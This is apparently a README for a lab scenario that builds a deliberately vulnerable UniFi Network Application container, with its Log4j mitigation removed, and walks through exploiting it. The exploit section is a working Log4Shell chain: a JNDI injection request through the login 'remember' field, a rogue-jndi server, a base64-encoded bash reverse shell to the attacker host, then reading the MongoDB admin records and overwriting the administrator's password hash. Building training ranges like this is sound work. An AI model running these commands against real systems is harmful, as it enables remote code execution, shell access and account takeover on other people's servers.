# Log4j

The folder `scenarios/log4j` holds the files related to the Log4j vulnerable scenario.

To understand what the Log4j vulnerability involves, the following resources were explored:

- **Cloudflare**
  - https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/
  - https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/
  - https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/
- **LunaSec**
  - https://www.lunasec.io/docs/blog/log4j-zero-day/
- **LiveOverflow**
  - https://www.youtube.com/watch?v=kvREvOvSWt4
- **John Hammond:**
  - https://www.youtube.com/watch?v=7qoPDq41xhQ
- **TryHackMe**
  - https://tryhackme.com/room/solar#
  - https://m3n0sd0n4ld.github.io/thm/Lumberjack-Turtle/
  - https://www.youtube.com/watch?v=lJeAgQQaDEw (Shows how to update shell to Meterpreter)
- **SnykLearn**
  - https://learn.snyk.io/lessons/log4shell/java/
- **Reddit (Large Resource)**
  - https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/

## GitHub-Related References

- **GitHub**
  - Log4j Obfuscating Strings: https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
  - Log4j POC: 
  - https://github.com/cyberxml/log4j-poc
  - https://github.com/kozmer/log4j-shell-poc
  - https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
  - Log4j Vulnerable App: https://github.com/christophetd/log4shell-vulnerable-app
  - YARA rules (DETECTION): https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b
  - Unifi: https://github.com/puzzlepeaches/Log4jUnifi
  - MarshalSec (Malicious LDAP): https://github.com/mbechler/marshalsec

This scenario is based on the Tier 2 HackTheBox **Unified** challenge and in the [SprocketSecurity blog](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi).

To reproduce a vulnerable version of Unifi Network Application the Docker container used was adapted from [goofball/unifi](https://github.com/goofball222/unifi). The version (which can also be customized) is `6.4.54`. 

Typically, most of the Docker images present in this source were patched against Log4j, for instance, through the `JVM_EXTRA_OPTS=-Dlog4j2.formatMsgNoLookups=true` environment variable present in the respective Dockerfile. This turns off variable lookups in the Log4j logging tool, which is vulnerable, meaning the final attack is unsuccessful.

After finding this was an issue in our vulnerable scenario, this option was removed from the Dockerfile. It's also important to notice that this Dockerfile is also built with a MongoDB database that supports the UniFi Network Application and where users are saved, according to [SprocketSecurity blog](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi).

> Deployment of the scenario was automated using Ansible. This may suffer changes in the future.

## Other Important Aspects During Setup

Initially, the HTTPS connection was insecure when accessing the UniFi Application Network web interface because a trusted CA didn't sign the presented certificate in the TLS connection. To overcome this issue, we created a CA, as in the `ca/` folder. 

To achieve this, the commands in `ca/cmds.sh` were issued:

```bash
# Generate CA keys (private and public keys)
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -keyout ca.key -out ca.crt

# Generating Certificate Signing Request (notice the subjectAltName which is mandatory, at least in Firefox!)
openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj "/CN=example-domain.ui.com/O=UniFi/C=US" -passout pass:pass -addext "subjectAltName = DNS:example-domain.ui.com"

# Generate Server Public-key Certificate
openssl ca -config openssl.cnf -policy policy_anything -md sha256 -days 3650 -in server.csr -out server.crt -batch -cert ca.crt -keyfile ca.key

# Remove Password from server's private key
openssl rsa -in server.key -out server_nopass.key
```

> Notice the need for the `openssl.cnf`, `serial`, `demoCA/`, and `index.txt` files/folders.

Afterward, the private key of the issued certificate without password protection (`server_nopass.key`) was copied into the `unifi-certs/` folder (this file was named **privkey.pem**), which is where our Docker bind mount is located. This is where UniFi fetches its SSL certificates.

*We've forced UniFi always to fetch the SSL certificates on every run, as this wasn't happening on every run by default. These changes were enforced in the `entrypoint-functions.sh` file*. 

Then, regarding the **fullchain.pem**, we simply used:

```bash
cat server.crt ca.crt > fullchain.pem
```

Notice there is a need to only include certificate information inside this file. No extra information should be present. The final format should be something like this:

```
-----BEGIN (CA) CERTIFICATE-----
#######################################
-----END (CA) CERTIFICATE-----
-----BEGIN (SERVER) CERTIFICATE-----
#######################################
-----END (SERVER) CERTIFICATE-----
```

Then, we needed to include our CA's public-key certificate by default on the attacker's Kali machine so that the page would appear safe when they visited the UniFi Network Application web interface. This was accomplished using the `policies.json` file in the `setup/` folder, where all the setup files (using Jinja2 templates) are present. The CA was defined as trusted also system-wide. The `entrypoint.sh` is the one that is triggered at the end and uses all the others.

Furthermore, a Selenium script, `setup/setup.py` was developed, being its primary purpose of completing the setup Wizard that appears on every start-up of the UniFi web interface. It creates an administrator user as specified in the credentials of the `all.yml` Ansible file. The `setup/requirements.txt` file holds the respective dependencies for the Selenium script to run.

# Exploit

Initially, I tried running exploits related to [TryHackMe Solr](https://tryhackme.com/room/solar#), but due to the Java version used by UniFi, it didn't work. It used [marshelsec](https://github.com/mbechler/marshalsec), a malicious LDAP server that redirected the LDAP request to a simple HTTP server that held a malicious Java payload.

Therefore, the solution presented in [SprocketSecurity](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) was taken into consideration.

First, we test if the Log4j vulnerability indeed exists. We can also visit the UniFi Network Application at `https://example-domain.ui.com:8443`.

In the attacker's machine, we run `nc -lnvp 9999`, and in another terminal, we can run:

```bash
curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.135.0.2:9999/whatever}","strict":true}'
```

> 172.135.0.2 is the attacker's machine IP address. Notice the "remember" parameter as the one vulnerable to the Log4j attack.

If we receive a connection in `nc`, we know the application is vulnerable to Log4j, which indeed is.

Then, by doing the following: 

```bash
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
```

We are using [rogue-jndi](https://github.com/veracode-research/rogue-jndi), a malicious LDAP application that creates an HTTP server to inject the payload.

We then generate our payload, which is:

```bash
echo 'bash -c bash -i >&/dev/tcp/172.135.0.2/4444 0>&1' | base64
```

We set up our netcat listener using `nc -lnvp 4444`, and then we run:

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTcyLjEzNS4wLjIvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "172.135.0.2"
```

By running:

```bash
curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.135.0.2:1389/o=tomcat}","strict":true}'
```

In our Netcat listener, we obtain a Reverse Shell with access to the victim machine.

> This [GitHub repository](https://github.com/puzzlepeaches/Log4jUnifi) specifies the same attack in an automated way using a Python script.

> ***The SprocketSecurity post dives deeper into lateral movement, which can also be interesting. For instance, changing UniFi's login page credentials, so we can enter it and potentially access new devices sitting in the Mesh network.***

Firstly, we can list the contents of the Administrators in MongoDB:

```
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.4.4
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.4.4
{
"_id" : ObjectId("64750f87f19ea8014a2ceb6d"),
"name" : "test_user",
"email" : "admin@hotmail.com",
"x_shadow" : "$6$msad4FLZ$WwZoWNYAGbcGY3bF8HVBQ.t.69dt/
ogu1nsmeTjsorz4dBl3Q0Waoya35R.Gm0qEgPoVsUorIhVRVpoiG8cFo/
",
"time_created" : NumberLong(1685393287),
"last_site_name" : "default"
}
```

Then, we generate the SHA-512 hash of the password string "mypassword", which will be used in the login page: `mkpasswd -m sha-512 mypassword`.

At last, we update the Administrator's password in MongoDB with the one we created using: `mongo --port 27117 ace --eval ’db.admin.update({"_id":ObjectId
("ADMIN_OBJECT_ID")},{$set:{"x_shadow":"$6$zsmtIX0rAM.
G4P8a$TKt4eg15VC11zpQaCVS6nLHdOYOzlfjO5m3Tvle7rtc1SOvMRYTT0jBBnRc
CqY5lAOLDNst3xfGQdX99GtpD0."}})’`.

We can now successfully use `test_user` as the username and `mypassword` as the password to login in UniFi's dashboard.


> There is also the possibility of upgrading to a better shell.